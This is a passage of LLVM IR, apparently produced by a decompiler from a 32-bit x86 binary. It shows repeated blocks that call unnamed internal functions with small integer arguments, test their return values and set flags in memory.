  store i32 %v0_8048f34, i32* %v3_8048f34, align 4
  %v1_8048f35 = add i32 %v1_8048f33, -12
  %v2_8048f35 = inttoptr i32 %v1_8048f35 to i32*
  store i32 0, i32* %v2_8048f35, align 4
  %v1_8048f37 = add i32 %v1_8048f33, -16
  %v2_8048f37 = inttoptr i32 %v1_8048f37 to i32*
  store i32 45, i32* %v2_8048f37, align 4
  %v3_8048f39 = call i32 @function_8051c20(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048f39, i32* %eax.global-to-local, align 4
  %v0_8048f3e = load i32, i32* @esp, align 4
  %v9_8048f3e = icmp eq i32 %v0_8048f3e, -12
  store i1 %v9_8048f3e, i1* %zf.global-to-local, align 1
  %v2_8048f41 = add i32 %v0_8048f3e, 8
  %v3_8048f41 = inttoptr i32 %v2_8048f41 to i32*
  store i32 %v3_8048f39, i32* %v3_8048f41, align 4
  %v1_8048f42 = add i32 %v0_8048f3e, 120
  %v2_8048f42 = inttoptr i32 %v1_8048f42 to i32*
  %v3_8048f42 = load i32, i32* %v2_8048f42, align 4
  store i32 %v3_8048f42, i32* @edx, align 4
  %v2_8048f46 = add i32 %v0_8048f3e, 4
  %v3_8048f46 = inttoptr i32 %v2_8048f46 to i32*
  store i32 %v3_8048f42, i32* %v3_8048f46, align 4
  %v1_8048f47 = add i32 %v0_8048f3e, 147
  store i32 %v1_8048f47, i32* @ecx, align 4
  %v3_8048f4e = inttoptr i32 %v0_8048f3e to i32*
  store i32 %v1_8048f47, i32* %v3_8048f4e, align 4
  %v4_8048f4f = call i32 @function_8052910(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8048f54 = load i32, i32* @esp, align 4
  %v1_8048f54 = add i32 %v0_8048f54, 16
  %v1_8048f57 = add i32 %v4_8048f4f, 1
  %v8_8048f57 = icmp eq i32 %v1_8048f57, 0
  store i1 %v8_8048f57, i1* %zf.global-to-local, align 1
  store i32 %v1_8048f57, i32* %eax.global-to-local, align 4
  br i1 %v8_8048f57, label %dec_label_pc_8048f64, label %dec_label_pc_8048f5a

dec_label_pc_8048f5a:                             ; preds = %dec_label_pc_8048f33
  %v1_8048f5a = add i32 %v0_8048f54, 108
  %v2_8048f5a = inttoptr i32 %v1_8048f5a to i32*
  %v3_8048f5a = load i32, i32* %v2_8048f5a, align 4
  store i32 %v3_8048f5a, i32* %eax.global-to-local, align 4
  %v1_8048f5e = inttoptr i32 %v3_8048f5a to i32*
  store i32 1, i32* %v1_8048f5e, align 4
  %v0_8048f64.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048f64

dec_label_pc_8048f64:                             ; preds = %dec_label_pc_8048f33, %dec_label_pc_8048f5a
  %v0_8048f64 = phi i32 [ %v1_8048f54, %dec_label_pc_8048f33 ], [ %v0_8048f64.pre, %dec_label_pc_8048f5a ]
  %v1_8048f64 = add i32 %v0_8048f64, 92
  %v2_8048f64 = inttoptr i32 %v1_8048f64 to i32*
  %v3_8048f64 = load i32, i32* %v2_8048f64, align 4
  store i32 %v3_8048f64, i32* %edx.global-to-local, align 4
  %v1_8048f68 = add i32 %v3_8048f64, 4
  %v2_8048f68 = inttoptr i32 %v1_8048f68 to i32*
  store i32 0, i32* %v2_8048f68, align 4
  %v0_8048f6f = load i32, i32* %eax.global-to-local, align 4
  %v1_8048f6f = load i32, i32* @esp, align 4
  %v2_8048f6f = add i32 %v1_8048f6f, -4
  %v3_8048f6f = inttoptr i32 %v2_8048f6f to i32*
  store i32 %v0_8048f6f, i32* %v3_8048f6f, align 4
  %v0_8048f70 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048f70 = add i32 %v1_8048f6f, -8
  %v3_8048f70 = inttoptr i32 %v2_8048f70 to i32*
  store i32 %v0_8048f70, i32* %v3_8048f70, align 4
  %v1_8048f71 = add i32 %v1_8048f6f, -12
  %v2_8048f71 = inttoptr i32 %v1_8048f71 to i32*
  store i32 0, i32* %v2_8048f71, align 4
  %v1_8048f73 = add i32 %v1_8048f6f, -16
  %v2_8048f73 = inttoptr i32 %v1_8048f73 to i32*
  store i32 44, i32* %v2_8048f73, align 4
  %v3_8048f75 = call i32 @function_8051c20(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048f75, i32* %eax.global-to-local, align 4
  %v0_8048f7a = load i32, i32* @esp, align 4
  %v9_8048f7a = icmp eq i32 %v0_8048f7a, -12
  store i1 %v9_8048f7a, i1* %zf.global-to-local, align 1
  %v2_8048f7d = add i32 %v0_8048f7a, 8
  %v3_8048f7d = inttoptr i32 %v2_8048f7d to i32*
  store i32 %v3_8048f75, i32* %v3_8048f7d, align 4
  %v1_8048f7e = add i32 %v0_8048f7a, 120
  %v2_8048f7e = inttoptr i32 %v1_8048f7e to i32*
  %v3_8048f7e = load i32, i32* %v2_8048f7e, align 4
  store i32 %v3_8048f7e, i32* %eax.global-to-local, align 4
  %v2_8048f82 = add i32 %v0_8048f7a, 4
  %v3_8048f82 = inttoptr i32 %v2_8048f82 to i32*
  store i32 %v3_8048f7e, i32* %v3_8048f82, align 4
  %v1_8048f83 = add i32 %v0_8048f7a, 147
  store i32 %v1_8048f83, i32* @ecx, align 4
  %v3_8048f8a = inttoptr i32 %v0_8048f7a to i32*
  store i32 %v1_8048f83, i32* %v3_8048f8a, align 4
  %v4_8048f8b = call i32 @function_8052910(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8048f90 = load i32, i32* @esp, align 4
  %v1_8048f90 = add i32 %v0_8048f90, 16
  %v1_8048f93 = add i32 %v4_8048f8b, 1
  %v8_8048f93 = icmp eq i32 %v1_8048f93, 0
  store i1 %v8_8048f93, i1* %zf.global-to-local, align 1
  store i32 %v1_8048f93, i32* %eax.global-to-local, align 4
  br i1 %v8_8048f93, label %dec_label_pc_8049044, label %dec_label_pc_8048f9a

dec_label_pc_8048f9a:                             ; preds = %dec_label_pc_8048f64
  %v2_8048f9a = add i32 %v0_8048f90, 12
  %v3_8048f9a = inttoptr i32 %v2_8048f9a to i32*
  store i32 %v1_8048f93, i32* %v3_8048f9a, align 4
  %v0_8048f9b = load i32, i32* %eax.global-to-local, align 4
  %v2_8048f9b = add i32 %v0_8048f90, 8
  %v3_8048f9b = inttoptr i32 %v2_8048f9b to i32*
  store i32 %v0_8048f9b, i32* %v3_8048f9b, align 4
  %v1_8048f9c = add i32 %v0_8048f90, 4
  %v2_8048f9c = inttoptr i32 %v1_8048f9c to i32*
  store i32 0, i32* %v2_8048f9c, align 4
  %v2_8048f9e = inttoptr i32 %v0_8048f90 to i32*
  store i32 44, i32* %v2_8048f9e, align 4
  %v3_8048fa0 = call i32 @function_8051c20(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048fa0, i32* %eax.global-to-local, align 4
  %v0_8048fa5 = load i32, i32* @esp, align 4
  %v9_8048fa5 = icmp eq i32 %v0_8048fa5, -12
  store i1 %v9_8048fa5, i1* %zf.global-to-local, align 1
  %v2_8048fa8 = add i32 %v0_8048fa5, 8
  %v3_8048fa8 = inttoptr i32 %v2_8048fa8 to i32*
  store i32 %v3_8048fa0, i32* %v3_8048fa8, align 4
  %v1_8048fa9 = add i32 %v0_8048fa5, 120
  %v2_8048fa9 = inttoptr i32 %v1_8048fa9 to i32*
  %v3_8048fa9 = load i32, i32* %v2_8048fa9, align 4
  %v2_8048fad = add i32 %v0_8048fa5, 4
  %v3_8048fad = inttoptr i32 %v2_8048fad to i32*
  store i32 %v3_8048fa9, i32* %v3_8048fad, align 4
  %v1_8048fae = add i32 %v0_8048fa5, 147
  store i32 %v1_8048fae, i32* %eax.global-to-local, align 4
  %v3_8048fb5 = inttoptr i32 %v0_8048fa5 to i32*
  store i32 %v1_8048fae, i32* %v3_8048fb5, align 4
  %v4_8048fb6 = call i32 @function_8052910(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8048fb6, i32* %eax.global-to-local, align 4
  %v0_8048fbb = load i32, i32* @esp, align 4
  %v6_8048fbb = icmp eq i32 %v0_8048fbb, -16
  store i1 %v6_8048fbb, i1* %zf.global-to-local, align 1
  store i32 %v4_8048fb6, i32* %ebx.global-to-local, align 4
  %v2_8048fc0 = add i32 %v4_8048fb6, 147
  %v3_8048fc0 = add i32 %v2_8048fc0, %v0_8048fbb
  %v4_8048fc0 = inttoptr i32 %v3_8048fc0 to i8*
  %v5_8048fc0 = load i8, i8* %v4_8048fc0, align 1
  %v11_8048fc0 = icmp eq i8 %v5_8048fc0, 32
  %v1_8048fc8 = zext i1 %v11_8048fc0 to i32
  %v1_8048fcb = add i32 %v0_8048fbb, 147
  store i32 %v1_8048fcb, i32* %esi.global-to-local, align 4
  store i32 %v1_8048fc8, i32* %eax.global-to-local, align 4
  %v1_8048fd7 = add i32 %v0_8048fbb, 12
  %v2_8048fd7 = inttoptr i32 %v1_8048fd7 to i32*
  store i32 2, i32* %v2_8048fd7, align 4
  %v1_8048fd9 = add i32 %v0_8048fbb, 8
  %v2_8048fd9 = inttoptr i32 %v1_8048fd9 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80554e6.10 to i32), i32* %v2_8048fd9, align 4
  %v0_8048fde = load i32, i32* %ebx.global-to-local, align 4
  %v1_8048fde = load i32, i32* %eax.global-to-local, align 4
  %v2_8048fde = add i32 %v1_8048fde, %v0_8048fde
  store i32 %v2_8048fde, i32* @ebx, align 4
  %v1_8048fe0 = add i32 %v0_8048fbb, 120
  %v2_8048fe0 = inttoptr i32 %v1_8048fe0 to i32*
  %v3_8048fe0 = load i32, i32* %v2_8048fe0, align 4
  %v2_8048fe4 = sub i32 %v3_8048fe0, %v2_8048fde
  store i32 %v2_8048fe4, i32* %eax.global-to-local, align 4
  %v0_8048fe6 = load i32, i32* %esi.global-to-local, align 4
  %v2_8048fe6 = add i32 %v0_8048fe6, %v2_8048fde
  %v12_8048fe6 = icmp eq i32 %v2_8048fe6, 0
  store i1 %v12_8048fe6, i1* %zf.global-to-local, align 1
  store i32 %v2_8048fe6, i32* @esi, align 4
  %v2_8048fe8 = add i32 %v0_8048fbb, 4
  %v3_8048fe8 = inttoptr i32 %v2_8048fe8 to i32*
  store i32 %v2_8048fe4, i32* %v3_8048fe8, align 4
  %v0_8048fe9 = load i32, i32* @esi, align 4
  %v3_8048fe9 = inttoptr i32 %v0_8048fbb to i32*
  store i32 %v0_8048fe9, i32* %v3_8048fe9, align 4
  %v0_8048fea = call i32 @function_80526d0()
  store i32 %v0_8048fea, i32* %eax.global-to-local, align 4
  %v0_8048fef = load i32, i32* @esp, align 4
  %v1_8048fef = add i32 %v0_8048fef, 16
  store i32 %v0_8048fea, i32* %edx.global-to-local, align 4
  %v10_8048ff4 = icmp eq i32 %v0_8048fea, -1
  store i1 %v10_8048ff4, i1* %zf.global-to-local, align 1
  br i1 %v10_8048ff4, label %dec_label_pc_8049044, label %dec_label_pc_8048ff9

dec_label_pc_8048ff9:                             ; preds = %dec_label_pc_8048f9a
  %v10_8048ff9 = icmp eq i32 %v0_8048fea, 1
  store i1 %v10_8048ff9, i1* %zf.global-to-local, align 1
  %v7_8048ffc = icmp sgt i32 %v0_8048fea, 1
  br i1 %v7_8048ffc, label %dec_label_pc_8048ffe, label %dec_label_pc_8049001

dec_label_pc_8048ffe:                             ; preds = %dec_label_pc_8048ff9
  %v1_8048ffe = add i32 %v0_8048fea, -2
  %v9_8048ffe = icmp eq i32 %v1_8048ffe, 0
  store i1 %v9_8048ffe, i1* %zf.global-to-local, align 1
  store i32 %v1_8048ffe, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8049001

dec_label_pc_8049001:                             ; preds = %dec_label_pc_8048ff9, %dec_label_pc_8048ffe
  %v1_804900a = phi i32 [ %v0_8048fea, %dec_label_pc_8048ff9 ], [ %v1_8048ffe, %dec_label_pc_8048ffe ]
  %v1_8049001 = add i32 %v0_8048fef, 20920
  %v1_8049008 = load i32, i32* @ebx, align 4
  %v2_8049008 = add i32 %v1_8049001, %v1_8049008
  %v12_8049008 = icmp eq i32 %v2_8049008, 0
  store i1 %v12_8049008, i1* %zf.global-to-local, align 1
  store i32 %v2_8049008, i32* %eax.global-to-local, align 4
  %v2_804900a = add i32 %v1_804900a, -20773
  %v3_804900a = add i32 %v2_804900a, %v2_8049008
  %v4_804900a = inttoptr i32 %v3_804900a to i8*
  store i8 0, i8* %v4_804900a, align 1
  %v0_8049012 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049012 = load i32, i32* @esp, align 4
  %v2_8049012 = add i32 %v1_8049012, -4
  %v3_8049012 = inttoptr i32 %v2_8049012 to i32*
  store i32 %v0_8049012, i32* %v3_8049012, align 4
  %v0_8049013 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049013 = add i32 %v1_8049012, -8
  %v3_8049013 = inttoptr i32 %v2_8049013 to i32*
  store i32 %v0_8049013, i32* %v3_8049013, align 4
  %v1_8049014 = add i32 %v1_8049012, -12
  %v2_8049014 = inttoptr i32 %v1_8049014 to i32*
  store i32 0, i32* %v2_8049014, align 4
  %v1_8049016 = add i32 %v1_8049012, -16
  %v2_8049016 = inttoptr i32 %v1_8049016 to i32*
  store i32 43, i32* %v2_8049016, align 4
  %v3_8049018 = call i32 @function_8051c20(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049018, i32* %eax.global-to-local, align 4
  %v0_804901d = load i32, i32* @esi, align 4
  %v1_804901d = load i32, i32* @esp, align 4
  %v2_804901d = inttoptr i32 %v1_804901d to i32*
  store i32 %v0_804901d, i32* %v2_804901d, align 4
  store i32 %v3_8049018, i32* @ebx, align 4
  %v2_8049022 = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_8049022, i32* %eax.global-to-local, align 4
  %v0_8049027 = load i32, i32* @esp, align 4
  %v9_8049027 = icmp eq i32 %v0_8049027, -12
  store i1 %v9_8049027, i1* %zf.global-to-local, align 1
  %v0_804902a = load i32, i32* @ebx, align 4
  %v2_804902a = add i32 %v0_8049027, 8
  %v3_804902a = inttoptr i32 %v2_804902a to i32*
  store i32 %v0_804902a, i32* %v3_804902a, align 4
  %v2_804902b = add i32 %v0_8049027, 4
  %v3_804902b = inttoptr i32 %v2_804902b to i32*
  store i32 %v2_8049022, i32* %v3_804902b, align 4
  %v0_804902c = load i32, i32* @esi, align 4
  %v3_804902c = inttoptr i32 %v0_8049027 to i32*
  store i32 %v0_804902c, i32* %v3_804902c, align 4
  %v4_804902d = call i32 @function_8052910(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804902d, i32* %eax.global-to-local, align 4
  %v0_8049032 = load i32, i32* @esp, align 4
  %v1_8049032 = add i32 %v0_8049032, 16
  %v1_8049035 = icmp eq i32 %v4_804902d, 0
  store i1 %v1_8049035, i1* %zf.global-to-local, align 1
  br i1 %v1_8049035, label %dec_label_pc_8049044, label %dec_label_pc_8049039

dec_label_pc_8049039:                             ; preds = %dec_label_pc_8049001
  %v1_8049039 = add i32 %v0_8049032, 108
  %v2_8049039 = inttoptr i32 %v1_8049039 to i32*
  %v3_8049039 = load i32, i32* %v2_8049039, align 4
  store i32 %v3_8049039, i32* %edx.global-to-local, align 4
  %v1_804903d = add i32 %v3_8049039, 4
  %v2_804903d = inttoptr i32 %v1_804903d to i32*
  store i32 1, i32* %v2_804903d, align 4
  %v0_8049044.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049044

dec_label_pc_8049044:                             ; preds = %dec_label_pc_8049001, %dec_label_pc_8048f9a, %dec_label_pc_8048f64, %dec_label_pc_8049039
  %v0_8049044 = phi i32 [ %v1_8049032, %dec_label_pc_8049001 ], [ %v1_8048fef, %dec_label_pc_8048f9a ], [ %v1_8048f90, %dec_label_pc_8048f64 ], [ %v0_8049044.pre, %dec_label_pc_8049039 ]
  %v1_8049044 = add i32 %v0_8049044, 92
  %v2_8049044 = inttoptr i32 %v1_8049044 to i32*
  %v3_8049044 = load i32, i32* %v2_8049044, align 4
  store i32 %v3_8049044, i32* %ecx.global-to-local, align 4
  %v1_8049048 = add i32 %v3_8049044, 8
  %v2_8049048 = inttoptr i32 %v1_8049048 to i32*
  store i32 0, i32* %v2_8049048, align 4
  %v0_804904f = load i32, i32* %eax.global-to-local, align 4
  %v1_804904f = load i32, i32* @esp, align 4
  %v2_804904f = add i32 %v1_804904f, -4
  %v3_804904f = inttoptr i32 %v2_804904f to i32*
  store i32 %v0_804904f, i32* %v3_804904f, align 4
  %v0_8049050 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049050 = add i32 %v1_804904f, -8
  %v3_8049050 = inttoptr i32 %v2_8049050 to i32*
  store i32 %v0_8049050, i32* %v3_8049050, align 4
  %v1_8049051 = add i32 %v1_804904f, -12
  %v2_8049051 = inttoptr i32 %v1_8049051 to i32*
  store i32 0, i32* %v2_8049051, align 4
  %v1_8049053 = add i32 %v1_804904f, -16
  %v2_8049053 = inttoptr i32 %v1_8049053 to i32*
  store i32 41, i32* %v2_8049053, align 4
  %v3_8049055 = call i32 @function_8051c20(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049055, i32* %eax.global-to-local, align 4
  %v0_804905a = load i32, i32* @esp, align 4
  %v9_804905a = icmp eq i32 %v0_804905a, -12
  store i1 %v9_804905a, i1* %zf.global-to-local, align 1
  %v2_804905d = add i32 %v0_804905a, 8
  %v3_804905d = inttoptr i32 %v2_804905d to i32*
  store i32 %v3_8049055, i32* %v3_804905d, align 4
  %v1_804905e = add i32 %v0_804905a, 120
  %v2_804905e = inttoptr i32 %v1_804905e to i32*
  %v3_804905e = load i32, i32* %v2_804905e, align 4
  %v2_8049062 = add i32 %v0_804905a, 4
  %v3_8049062 = inttoptr i32 %v2_8049062 to i32*
  store i32 %v3_804905e, i32* %v3_8049062, align 4
  %v1_8049063 = add i32 %v0_804905a, 147
  store i32 %v1_8049063, i32* %eax.global-to-local, align 4
  %v3_804906a = inttoptr i32 %v0_804905a to i32*
  store i32 %v1_8049063, i32* %v3_804906a, align 4
  %v4_804906b = call i32 @function_8052910(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049070 = load i32, i32* @esp, align 4
  %v1_8049070 = add i32 %v0_8049070, 16
  %v1_8049073 = add i32 %v4_804906b, 1
  %v8_8049073 = icmp eq i32 %v1_8049073, 0
  store i1 %v8_8049073, i1* %zf.global-to-local, align 1
  store i32 %v1_8049073, i32* %eax.global-to-local, align 4
  br i1 %v8_8049073, label %dec_label_pc_8049124, label %dec_label_pc_804907a

dec_label_pc_804907a:                             ; preds = %dec_label_pc_8049044
  %v0_804907a = load i32, i32* @edi, align 4
  %v2_804907a = add i32 %v0_8049070, 12
  %v3_804907a = inttoptr i32 %v2_804907a to i32*
  store i32 %v0_804907a, i32* %v3_804907a, align 4
  %v0_804907b = load i32, i32* @edi, align 4
  %v2_804907b = add i32 %v0_8049070, 8
  %v3_804907b = inttoptr i32 %v2_804907b to i32*
  store i32 %v0_804907b, i32* %v3_804907b, align 4
  %v1_804907c = add i32 %v0_8049070, 4
  %v2_804907c = inttoptr i32 %v1_804907c to i32*
  store i32 0, i32* %v2_804907c, align 4
  %v2_804907e = inttoptr i32 %v0_8049070 to i32*
  store i32 41, i32* %v2_804907e, align 4
  %v3_8049080 = call i32 @function_8051c20(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049080, i32* %eax.global-to-local, align 4
  %v0_8049085 = load i32, i32* @esp, align 4
  %v9_8049085 = icmp eq i32 %v0_8049085, -12
  store i1 %v9_8049085, i1* %zf.global-to-local, align 1
  %v2_8049088 = add i32 %v0_8049085, 8
  %v3_8049088 = inttoptr i32 %v2_8049088 to i32*
  store i32 %v3_8049080, i32* %v3_8049088, align 4
  %v1_8049089 = add i32 %v0_8049085, 120
  %v2_8049089 = inttoptr i32 %v1_8049089 to i32*
  %v3_8049089 = load i32, i32* %v2_8049089, align 4
  %v2_804908d = add i32 %v0_8049085, 4
  %v3_804908d = inttoptr i32 %v2_804908d to i32*
  store i32 %v3_8049089, i32* %v3_804908d, align 4
  %v1_804908e = add i32 %v0_8049085, 147
  store i32 %v1_804908e, i32* @edx, align 4
  %v3_8049095 = inttoptr i32 %v0_8049085 to i32*
  store i32 %v1_804908e, i32* %v3_8049095, align 4
  %v4_8049096 = call i32 @function_8052910(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049096, i32* %eax.global-to-local, align 4
  %v0_804909b = load i32, i32* @esp, align 4
  %v6_804909b = icmp eq i32 %v0_804909b, -16
  store i1 %v6_804909b, i1* %zf.global-to-local, align 1
  store i32 %v4_8049096, i32* %ebx.global-to-local, align 4
  %v2_80490a0 = add i32 %v4_8049096, 147
  %v3_80490a0 = add i32 %v2_80490a0, %v0_804909b
  %v4_80490a0 = inttoptr i32 %v3_80490a0 to i8*
  %v5_80490a0 = load i8, i8* %v4_80490a0, align 1
  %v11_80490a0 = icmp eq i8 %v5_80490a0, 32
  %v1_80490a8 = zext i1 %v11_80490a0 to i32
  %v1_80490ab = add i32 %v0_804909b, 147
  store i32 %v1_80490ab, i32* %esi.global-to-local, align 4
  store i32 %v1_80490a8, i32* %eax.global-to-local, align 4
  %v1_80490b7 = add i32 %v0_804909b, 12
  %v2_80490b7 = inttoptr i32 %v1_80490b7 to i32*
  store i32 2, i32* %v2_80490b7, align 4
  %v1_80490b9 = add i32 %v0_804909b, 8
  %v2_80490b9 = inttoptr i32 %v1_80490b9 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80554e6.10 to i32), i32* %v2_80490b9, align 4
  %v0_80490be = load i32, i32* %ebx.global-to-local, align 4
  %v1_80490be = load i32, i32* %eax.global-to-local, align 4
  %v2_80490be = add i32 %v1_80490be, %v0_80490be
  store i32 %v2_80490be, i32* @ebx, align 4
  %v1_80490c0 = add i32 %v0_804909b, 120
  %v2_80490c0 = inttoptr i32 %v1_80490c0 to i32*
  %v3_80490c0 = load i32, i32* %v2_80490c0, align 4
  %v2_80490c4 = sub i32 %v3_80490c0, %v2_80490be
  store i32 %v2_80490c4, i32* %eax.global-to-local, align 4
  %v0_80490c6 = load i32, i32* %esi.global-to-local, align 4
  %v2_80490c6 = add i32 %v0_80490c6, %v2_80490be
  %v12_80490c6 = icmp eq i32 %v2_80490c6, 0
  store i1 %v12_80490c6, i1* %zf.global-to-local, align 1
  store i32 %v2_80490c6, i32* @esi, align 4
  %v2_80490c8 = add i32 %v0_804909b, 4
  %v3_80490c8 = inttoptr i32 %v2_80490c8 to i32*
  store i32 %v2_80490c4, i32* %v3_80490c8, align 4
  %v0_80490c9 = load i32, i32* @esi, align 4
  %v3_80490c9 = inttoptr i32 %v0_804909b to i32*
  store i32 %v0_80490c9, i32* %v3_80490c9, align 4
  %v0_80490ca = call i32 @function_80526d0()
  store i32 %v0_80490ca, i32* %eax.global-to-local, align 4
  %v0_80490cf = load i32, i32* @esp, align 4
  %v1_80490cf = add i32 %v0_80490cf, 16
  store i32 %v0_80490ca, i32* %edx.global-to-local, align 4
  %v10_80490d4 = icmp eq i32 %v0_80490ca, -1
  store i1 %v10_80490d4, i1* %zf.global-to-local, align 1
  br i1 %v10_80490d4, label %dec_label_pc_8049124, label %dec_label_pc_80490d9

dec_label_pc_80490d9:                             ; preds = %dec_label_pc_804907a
  %v10_80490d9 = icmp eq i32 %v0_80490ca, 1
  store i1 %v10_80490d9, i1* %zf.global-to-local, align 1
  %v7_80490dc = icmp sgt i32 %v0_80490ca, 1
  br i1 %v7_80490dc, label %dec_label_pc_80490de, label %dec_label_pc_80490e1

dec_label_pc_80490de:                             ; preds = %dec_label_pc_80490d9
  %v1_80490de = add i32 %v0_80490ca, -2
  %v9_80490de = icmp eq i32 %v1_80490de, 0
  store i1 %v9_80490de, i1* %zf.global-to-local, align 1
  store i32 %v1_80490de, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80490e1

dec_label_pc_80490e1:                             ; preds = %dec_label_pc_80490d9, %dec_label_pc_80490de
  %v1_80490ea = phi i32 [ %v0_80490ca, %dec_label_pc_80490d9 ], [ %v1_80490de, %dec_label_pc_80490de ]
  %v1_80490e1 = add i32 %v0_80490cf, 20920
  %v1_80490e8 = load i32, i32* @ebx, align 4
  %v2_80490e8 = add i32 %v1_80490e1, %v1_80490e8
  %v12_80490e8 = icmp eq i32 %v2_80490e8, 0
  store i1 %v12_80490e8, i1* %zf.global-to-local, align 1
  store i32 %v2_80490e8, i32* %eax.global-to-local, align 4
  %v2_80490ea = add i32 %v1_80490ea, -20773
  %v3_80490ea = add i32 %v2_80490ea, %v2_80490e8
  %v4_80490ea = inttoptr i32 %v3_80490ea to i8*
  store i8 0, i8* %v4_80490ea, align 1
  %v0_80490f2 = load i32, i32* @ebx, align 4
  %v1_80490f2 = load i32, i32* @esp, align 4
  %v2_80490f2 = add i32 %v1_80490f2, -4
  %v3_80490f2 = inttoptr i32 %v2_80490f2 to i32*
  store i32 %v0_80490f2, i32* %v3_80490f2, align 4
  %v0_80490f3 = load i32, i32* @ebx, align 4
  %v2_80490f3 = add i32 %v1_80490f2, -8
  %v3_80490f3 = inttoptr i32 %v2_80490f3 to i32*
  store i32 %v0_80490f3, i32* %v3_80490f3, align 4
  %v1_80490f4 = add i32 %v1_80490f2, -12
  %v2_80490f4 = inttoptr i32 %v1_80490f4 to i32*
  store i32 0, i32* %v2_80490f4, align 4
  %v1_80490f6 = add i32 %v1_80490f2, -16
  %v2_80490f6 = inttoptr i32 %v1_80490f6 to i32*
  store i32 42, i32* %v2_80490f6, align 4
  %v3_80490f8 = call i32 @function_8051c20(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80490f8, i32* %eax.global-to-local, align 4
  %v0_80490fd = load i32, i32* @esi, align 4
  %v1_80490fd = load i32, i32* @esp, align 4
  %v2_80490fd = inttoptr i32 %v1_80490fd to i32*
  store i32 %v0_80490fd, i32* %v2_80490fd, align 4
  store i32 %v3_80490f8, i32* @ebx, align 4
  %v2_8049102 = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_8049102, i32* %eax.global-to-local, align 4
  %v0_8049107 = load i32, i32* @esp, align 4
  %v9_8049107 = icmp eq i32 %v0_8049107, -12
  store i1 %v9_8049107, i1* %zf.global-to-local, align 1
  %v0_804910a = load i32, i32* @ebx, align 4
  %v2_804910a = add i32 %v0_8049107, 8
  %v3_804910a = inttoptr i32 %v2_804910a to i32*
  store i32 %v0_804910a, i32* %v3_804910a, align 4
  %v2_804910b = add i32 %v0_8049107, 4
  %v3_804910b = inttoptr i32 %v2_804910b to i32*
  store i32 %v2_8049102, i32* %v3_804910b, align 4
  %v0_804910c = load i32, i32* @esi, align 4
  %v3_804910c = inttoptr i32 %v0_8049107 to i32*
  store i32 %v0_804910c, i32* %v3_804910c, align 4
  %v4_804910d = call i32 @function_8052910(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804910d, i32* %eax.global-to-local, align 4
  %v0_8049112 = load i32, i32* @esp, align 4
  %v1_8049112 = add i32 %v0_8049112, 16
  %v1_8049115 = icmp eq i32 %v4_804910d, 0
  store i1 %v1_8049115, i1* %zf.global-to-local, align 1
  br i1 %v1_8049115, label %dec_label_pc_8049124, label %dec_label_pc_8049119

dec_label_pc_8049119:                             ; preds = %dec_label_pc_80490e1
  %v1_8049119 = add i32 %v0_8049112, 108
  %v2_8049119 = inttoptr i32 %v1_8049119 to i32*
  %v3_8049119 = load i32, i32* %v2_8049119, align 4
  store i32 %v3_8049119, i32* @ecx, align 4
  %v1_804911d = add i32 %v3_8049119, 8
  %v2_804911d = inttoptr i32 %v1_804911d to i32*
  store i32 1, i32* %v2_804911d, align 4
  %v1_8049124.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049124

dec_label_pc_8049124:                             ; preds = %dec_label_pc_8049044, %dec_label_pc_80490e1, %dec_label_pc_804907a, %dec_label_pc_8049119
  %v1_8049124 = phi i32 [ %v1_8049070, %dec_label_pc_8049044 ], [ %v1_8049112, %dec_label_pc_80490e1 ], [ %v1_80490cf, %dec_label_pc_804907a ], [ %v1_8049124.pre, %dec_label_pc_8049119 ]
  %v0_8049124 = load i32, i32* @ecx, align 4
  %v2_8049124 = add i32 %v1_8049124, -4
  %v3_8049124 = inttoptr i32 %v2_8049124 to i32*
  store i32 %v0_8049124, i32* %v3_8049124, align 4
  %v0_8049125 = load i32, i32* @ecx, align 4
  %v2_8049125 = add i32 %v1_8049124, -8
  %v3_8049125 = inttoptr i32 %v2_8049125 to i32*
  store i32 %v0_8049125, i32* %v3_8049125, align 4
  %v1_8049126 = add i32 %v1_8049124, -12
  %v2_8049126 = inttoptr i32 %v1_8049126 to i32*
  store i32 0, i32* %v2_8049126, align 4
  %v1_8049128 = add i32 %v1_8049124, -16
  %v2_8049128 = inttoptr i32 %v1_8049128 to i32*
  store i32 40, i32* %v2_8049128, align 4
  %v3_804912a = call i32 @function_8051c20(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_804912a, i32* %eax.global-to-local, align 4
  %v0_804912f = load i32, i32* @esp, align 4
  %v9_804912f = icmp eq i32 %v0_804912f, -12
  store i1 %v9_804912f, i1* %zf.global-to-local, align 1
  %v2_8049132 = add i32 %v0_804912f, 8
  %v3_8049132 = inttoptr i32 %v2_8049132 to i32*
